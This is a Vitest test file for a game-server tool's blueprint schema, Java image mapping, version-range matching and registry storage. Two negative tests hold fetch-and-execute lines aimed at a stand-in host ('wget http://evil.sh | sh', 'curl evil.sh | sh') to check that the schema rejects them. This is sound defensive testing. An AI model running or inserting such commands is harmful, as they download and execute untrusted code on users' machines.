import { describe, expect, it } from "vitest";
import { mkdtempSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { openAndMigrate } from "../../src/server/infra/db/index.js";
import { BlueprintRegistry } from "../../src/server/modules/blueprints/registry.js";
import {
  blueprintDocSchema,
  javaImageForVersion,
  rangeMatches,
} from "../../src/server/modules/blueprints/schema.js";
import { BUILTIN_BLUEPRINTS } from "../../src/server/modules/blueprints/builtin-catalog.js";

describe("blueprint schema v1 (FR-040)", () => {
  it("every builtin catalog entry validates against schema v1", () => {
    expect(BUILTIN_BLUEPRINTS.length).toBeGreaterThanOrEqual(6);
    for (const doc of BUILTIN_BLUEPRINTS) {
      const r = blueprintDocSchema.safeParse(doc);
      if (!r.success) {
        throw new Error(
          `${doc.slug}: ${r.error.issues.map((i) => `${i.path.join(".")}:${i.message}`).join("; ")}`,
        );
      }
    }
  });

  it("rejects shell-string run commands structurally (SEC-007 class)", () => {
    const bad = {
      ...(BUILTIN_BLUEPRINTS[0] as object),
      slug: "shell-bomb",
      run: {
        command: "java -jar server.jar & wget http://evil.sh | sh",
        workdir: "/data",
        stop: { kind: "console", command: "stop", timeoutSec: 30 },
        envCanon: {},
      },
    };
    expect(blueprintDocSchema.safeParse(bad).success).toBe(false);
  });

  it("rejects unknown ops in install pipeline (bounded registry, FR-042)", () => {
    const bad = {
      ...(BUILTIN_BLUEPRINTS[0] as object),
      slug: "shell-op",
      install: [{ op: "exec", cmd: "curl evil.sh | sh" }],
    };
    expect(blueprintDocSchema.safeParse(bad).success).toBe(false);
  });

  it("rejects invalid slugs and out-of-range ports", () => {
    const badSlug = { ...(BUILTIN_BLUEPRINTS[0] as object), slug: "9invalid-slug" };
    expect(blueprintDocSchema.safeParse(badSlug).success).toBe(false);
    const badPort = {
      ...(BUILTIN_BLUEPRINTS[0] as object),
      slug: "bad-port",
      ports: [{ name: "x", protocol: "tcp", default: 80, required: true }],
    };
    expect(blueprintDocSchema.safeParse(badPort).success).toBe(false);
  });
});

describe("java version mapping (FR-044)", () => {
  const vanilla = BUILTIN_BLUEPRINTS.find((b) => b.slug === "vanilla")!;

  it("maps MC >=26.x / 1.21.9+ to Java 25 image", () => {
    expect(javaImageForVersion(vanilla, "26.2")).toContain(":25");
    expect(javaImageForVersion(vanilla, "1.21.10")).toContain(":25");
  });

  it("maps 1.20.5-1.21.x to Java 21 and 1.18-1.20.4 to Java 17", () => {
    expect(javaImageForVersion(vanilla, "1.21.1")).toContain(":21");
    expect(javaImageForVersion(vanilla, "1.20.6")).toContain(":21");
    expect(javaImageForVersion(vanilla, "1.20.4")).toContain(":17");
    expect(javaImageForVersion(vanilla, "1.18")).toContain(":17");
  });

  it("refuses unmapped old versions (create-time validation)", () => {
    expect(javaImageForVersion(vanilla, "1.16.5")).toBeNull();
  });
});

describe("rangeMatches", () => {
  it.each([
    [">=26", "26.2", true],
    [">=26", "25", false],
    ["1.20.5 - 1.21.x", "1.21.1", true],
    ["1.20.5 - 1.21.x", "1.22.0", false],
    ["1.18 - 1.20.4", "1.20.4", true],
    ["1.18 - 1.20.4", "1.20.5", false],
  ])("%s vs %s -> %s", (range, version, expected) => {
    expect(rangeMatches(range, version)).toBe(expected);
  });
});

describe("registry", () => {
  function makeRegistry(): { reg: BlueprintRegistry; db: ReturnType<typeof openAndMigrate> } {
    const dir = mkdtempSync(join(tmpdir(), "renom-bp-"));
    const db = openAndMigrate(join(dir, "t.db"));
    return { reg: new BlueprintRegistry(db), db };
  }

  it("seeds builtins idempotently and lists them", () => {
    const { reg, db } = makeRegistry();
    try {
      const first = reg.seedBuiltins();
      expect(first.length).toBe(BUILTIN_BLUEPRINTS.length);
      expect(reg.seedBuiltins()).toEqual([]); // second run no-ops
      expect(reg.count()).toBe(BUILTIN_BLUEPRINTS.length);
      const slugs = reg.list().map((b) => b.slug);
      expect(slugs).toContain("vanilla");
      expect(slugs).toContain("paper");
      expect(slugs).toContain("bedrock-bds");
    } finally {
      db.close();
    }
  });

  it("stores and retrieves versioned docs with hashes", () => {
    const { reg, db } = makeRegistry();
    try {
      reg.seedBuiltins();
      const doc = reg.getDoc("paper");
      expect(doc.slug).toBe("paper");
      expect(doc.run.command).toEqual([
        "java",
        "-Xms{initMemory}M",
        "-Xmx{maxMemory}M",
        "-jar",
        "paper.jar",
        "nogui",
      ]);
      const updated = { ...doc, description: "updated desc", tag: "v2" };
      const res = reg.importDoc(updated);
      expect(res.tag).toBe("v2");
      expect(reg.getDoc("paper").description).toBe("updated desc");
      expect(reg.getDoc("paper", "v1").description).not.toBe("updated desc"); // history kept
    } finally {
      db.close();
    }
  });

  it("rejects invalid imports with actionable validation errors", () => {
    const { reg, db } = makeRegistry();
    try {
      expect(() => reg.importDoc({ schemaVersion: 2 })).toThrow(/schema/i);
    } finally {
      db.close();
    }
  });
});
